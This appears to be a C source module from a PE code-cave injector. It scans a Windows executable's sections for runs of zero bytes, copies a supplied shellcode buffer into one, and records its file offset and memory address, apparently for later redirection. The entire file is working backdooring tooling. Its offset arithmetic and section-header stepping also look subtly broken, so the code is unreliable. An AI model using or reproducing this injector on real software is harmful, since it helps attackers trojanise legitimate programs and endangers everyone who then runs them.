#include "../lib/inject.h"

// Opaque types , Only this module needs to see them.

#define INJECT_STATE_NONE 0
#define INJECT_STATE_PARSING 1

short injectData(struct _PE_STRUCTURE *pe , struct _IMAGE_SECTION_HEADER **sections , compound_file *shellcode , struct inject_d *id){
	unsigned int nSections = pe->image_nt_header->image_file_header.numberOfSections;
	size_t space;
	// short state = INJECT_STATE_NONE;

	for(size_t i = 0 ; i < nSections ; i++){
		void *data = pe->buffer;
		data += sections[i]->virtualAddress;
		short state = INJECT_STATE_NONE;
		space = 0;
		for(size_t j = 0 ; j < sections[i]->sizeOfRawData ; j++ ){ //pe->buffer + sections[n]->virtualAddress = position in buffer of the n'th pe section
			if(*(char *)(data+j) == 0){
				space++;
				if(space == shellcode->size + INJECT_EXTRA_SPACE){
					memcpy(data + j - (space + INJECT_EXTRA_SPACE), shellcode->buffer, shellcode->size);
						id->offset_in_file = pe_map_to_file_offset(pe, data + j - space - INJECT_EXTRA_SPACE);
						id->position_in_memory = pe_map_buffer_to_memoryEx(pe, data + j - space - INJECT_EXTRA_SPACE);

					return 1;
				}
				state = INJECT_STATE_PARSING;
			}
			else{
				space = 0;
				state = INJECT_STATE_NONE;
			}
		}
	}

	return 0;
}

vVector *getSections( struct _PE_STRUCTURE *pe ){
	vVector *sections = vVector_init();
	if(!sections)
		return NULL;

	IMAGE_SECTION_HEADER *section = pe->image_section_header;
	for(size_t i = 0 ; i < pe->image_nt_header->image_file_header.numberOfSections ;i++ ){
		//Add section
		vVector_pushback(sections, section);
		section = (struct _IMAGE_SECTION_HEADER *)(section->name + sizeof(struct _IMAGE_SECTION_HEADER));
	}

	return sections;
}
